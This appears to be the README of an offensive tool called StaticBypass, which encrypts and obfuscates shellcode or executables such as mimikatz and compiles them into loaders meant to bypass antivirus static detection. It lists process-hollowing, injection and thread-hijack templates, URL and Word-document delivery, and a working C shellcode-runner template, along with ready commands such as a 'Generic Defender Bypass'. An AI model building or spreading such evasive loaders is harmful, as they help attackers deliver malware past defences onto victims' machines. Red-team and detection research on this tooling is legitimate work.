# StaticBypass - Template-based, modular, multi-language, shellcode obfuscator and compiler

## Features
- Takes in a raw shellcode or executable file, applies encryptors and obfuscators, formats it, places it into a template, and compiles it
- Supports C, C#, PowerShell, VBA, Rust, Go, and Pascal
- Automates placing VBA code into a word document
- Supports AES, XOR, and RC4 encryption, and Dictionary, UUID, IPv4, IPv6, and MAC address obfuscation
- Designed to bypass static detection methods

## Usage
```
python3 staticbypass.py -h                                                                                
usage: staticbypass.py [-h] [-e [TRANSFORMERS ...]] -s SHELLCODE -t TEMPLATE -l {rs,cs,vba,ps1,c} [-f OBFUSCATOR] [-b PREPROCESSORS] [-a POSTPROCESSORS] [-d DELIVERY] [-o OUTPUT]

options:
  -h, --help            show this help message and exit
  -e, --transformers [TRANSFORMERS ...]
                        Transformers encrypt or encode the shellcode and is decrypted or decoded at runtime.
  -s, --shellcode SHELLCODE
                        Specifies the raw binary shellcode file
  -t, --template TEMPLATE
                        Template that the shellcode and deobfuscation code will be placed into.
  -l, --language {rs,cs,vba,ps1,c}
                        Language used to write and compile
  -f, --obfuscator OBFUSCATOR
                        Obfuscators transform the transformed shellcode bytes into other formats, such as strings.
  -b, --preprocessors PREPROCESSORS
                        Preprocessors modify the shellcode but are self decoding.
  -a, --postprocessors POSTPROCESSORS
                        Postprocessors obfuscate the resulting exe or script, e.g. packers
  -d, --delivery DELIVERY
                        Delivery defines where the obfuscated shellcode is retrieved
  -o, --output OUTPUT   Output file name
```

## Examples
```
# Generic Defender Bypass
python3 staticbypass.py --obfuscator DictObfuscate --transformers XOREncrypt RC4Encrypt AESEncrypt --shellcode ~/shellcode.bin --template shellcoderunner --language cs

# Process hollow in  that uses mkpivm64 to execute the shellcode in a VM then RC4 Encrypt it and strip it after compiling
python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t shellcoderunner -l c -a strip

# Donut an executable then AESEncrypt it and UUIDEncode it and compile it with rust
python3 staticbypass.py -s mimikatz.exe -b donut -e AESEncrypt -t shellcoderunner -l rust

# Generate a vba script that uses writes text into the word document
python3 staticbypass.py -s ~/shellcode.bin -e DictObfuscate -a embedtext -t processhollow -l vba
```

## Roadmap
- Add obfuscator support for the different programming languages
- Add more templates e.g. early bird apc injection, heap allocation
- Refactor code
- Add arguments to templates and other categories
- Add guardrails
- Finish install script

## Installation
### Install pre-reqs
```
sudo apt install mono-devel mingw-w64 wine osslsigncode libz-mingw-w64-dev
```

### Download project
```
git clone https://github.com/nanmonee/staticbypass.git
python3 -m venv env
source env/bin/activate
pip install -r requirements.txt
```

## Currently Implemented


| Category      | Name            | Languages                | Description |
|:-------------:|:---------------:|:------------------------:|:------------|
| Delivery      | embedded        | All                      | Shellcode stored within the executable |
|               | webdelivery     | All                      | Download string, raw bytes, or list from specified URL |
|               | regkey          | C#, PS                   | Retrieve shellcode from registry key |
|               | embedtext       | VBA                      | Store shellcode string inside Word document |
| Pre-processor | mkpivm64        | All                      | Virtualize shellcode for obfuscation (requires template with RWX) by @D7EAD |
|               | donut           | All                      | Convert executable to shellcode |
| Transformer   | AESEncrypt      | C, C#, PS, Rust, Go, PS  | AES Encryption |
|               | TinyAES         | C                        | AES Encryption without libraries |
|               | XOREncrypt      | All                      | XOR Encryption |
|               | RC4Encrypt      | All                      | RC4 Encryption |
|               | RSAEncrypt      | C#                       | RSA Encryption |
|               | Rotate          | C                        | Rotate each byte by n bits |
|               | Shuffle         | C                        | Shuffle bytes reversibly |
|               | zlibcompress    | C, C#, Go, Rust, Pascal, PS  | Compression with zlib |
| Obfuscator    | Base64Encode    | All                      | Base64 Encode |
|               | DictObfuscate   | All                      | Convert bytes into randomly picked dictionary words |
|               | IPv4Obfuscate   | All                      | Convert bytes into IPv4 addresses |
|               | IPv6Obfuscate   | All                      | Convert bytes into IPv6 addresses |
|               | MACObfuscate    | All                      | Convert bytes into MAC addresses |
|               | UUIDEncode      | All                      | Convert bytes into UUIDv4 strings |
|               | EmojiEncode     | C, C#, PS                | Convert bytes into emoji |
|               | Brainfuck       | C                        | Convert bytes into a brainfuck string (slow) |
|               | Whitespace      | C                        | Convert bytes into tabs and spaces |
| Template      | shellcoderunner | All                      | Simple shellcode runner using CreateThread |
|               | processstomp    | C, C#, PS, Rust, Go, VBA | Process hollowing via overwriting entrypoint |
|               | spawnandinject  | C, C#, PS, Rust, Go      | Spawn process and inject into remote thread |
|               | service         | C                        | Template for running executable as service |
|               | processinject   | C                        | Search for explorer.exe and create a remote thread |
|               | delayedhollow   | C                        | Process hollowing with delay |
|               | hellsgate       | C                        | Dynamic API resolution using HellsGate technique |
|               | threadhijack    | C                        | Hijack running thread in existing process |
|               | bzip2           | C                        | Process hollowing using legitimate bzip2 code as cover |
|               | sqlite3         | C                        | Process hollowing using legitimate sqlite3 code as cover |
| Postprocessor | strip           | C, C#, Rust, Pascal      | Strip symbols from executable |
|               | sign            | C, Rust, Go, Pascal      | Sign executable with self-signed certificate |
|               | obfell          | PS                       | PowerShell obfuscator by @Jael-G |
|               | junkpile        | PS                       | PowerShell obfuscator by @bobby-tablez |

## Project Structure
```
staticbypass
├── c
    └── delivery
    └── preprocessors
    └── transformers
    └── obfuscators
    └── postprocessors
    └── templates
...
├── wordlists
    └── ...
├── bin
    └── ...
├── requirements.txt
└── staticbypass.py
```

## Transformer Object
Transformers are expected to take in a byte array, perform any encryption, or encoding, and then return another byte array. Obfuscators are similar but take in a byte array and converts it into a different format, for example a string or array of strings.
```
import base64
import random
import string

# Name the class the same as the file
class Base64Encode:

    # Define any variables created when the object is created
    # For example, you may randomize the name to prevent function
    # name clashes
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    # Return any imports your code uses
    # Imports are deduplicated (and order is retained)
    def imports(self) -> list[str]:
        return ["using System.Text;"]
    
    # Return any options required by the compiler
    # For example, libraries that need to be linked
    def compilerOptions(self) -> list[str]:
        return []

    # Return the code that deobfuscates the code in the target language
    def codeblock(self) -> str:
        return """

        public static byte[] {name}(string encoded)
        {{
            return Convert.FromBase64String(encoded);
        }}
""".format(name = self.name)

    # Perform the obfuscation of the code
    def obfuscate(self, decoded: bytes) -> str:
        return base64.b64encode(decoded).decode()

    # Write the function call into the source code file
    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
```

## Template Object
Template objects include functions that return imports, any compiler options required, and the template code that includes placeholders for the shellcode, transformers, codeblocks, imports, and shellcode size.
```
class shellcoderunner:

    # Return any imports required
    def imports(self) -> list[str]:
        return ["#include <windows.h>", "#include <stdio.h>", "#include <stdlib.h>"]

    # Return any compiler options neede
    def compilerOptions(self) -> list[str]:
        return []

    # Return the template block with the placeholders for each item
    def template(self) -> str:
        return """
{imports}

{codeblocks}

int main() {{
    {shellcode}
    {transformers}
    LPVOID buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(buffer, shellcode, {shellcodeSize});

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    VirtualFree(buffer, 0, MEM_RELEASE);

    return 0;
}}
"""
```

## Pre/Post Processors
Pre and Post processors have only an apply function. Pre-processors take the shellcode from the input file and apply a transformation that does not get reversed by the program, e.g. encapsulating the shellcode in a virtual machine. 

Postprocessors take the output file name and perform obfuscation on the result of the compilation, e.g. stripping, packing, etc.
```
import subprocess
import platform

class strip:

    def apply(self, outfile: str) -> None:
        if platform.system() == 'Linux':
            result = subprocess.run(['strip', '--strip-all', f'{outfile}'])
```
